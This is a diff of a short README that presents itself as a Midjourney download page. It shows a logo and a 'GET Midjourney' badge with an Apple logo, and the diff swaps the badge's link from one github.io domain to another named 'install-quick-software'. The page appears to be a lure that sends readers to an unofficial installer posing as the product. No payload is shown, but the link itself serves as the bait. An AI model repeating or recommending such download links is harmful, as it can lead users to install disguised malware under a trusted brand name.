@@ -1,13 +1,13 @@
 # Midjourney – Creative AI Image Generation Studio  
 
 <div align="center">  
-<img src="https://logos-world.net/wp-content/uploads/2024/11/Midjourney-Logo.png" alt="Midjourney Logo" width="1200">  
+<img src="https://logos-world.net/wp-content/uploads/2024/11/Midjourney-Logo.png" alt="Midjourney Logo" width="500">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/midjourney">  
+<a href="https://install-quick-software.github.io/.github/midjourney">  
 <img src="https://img.shields.io/badge/💻_GET_Midjourney-orange?style=for-the-badge&logo=apple" alt="GET Midjourney">  
 </a>  
 </div>
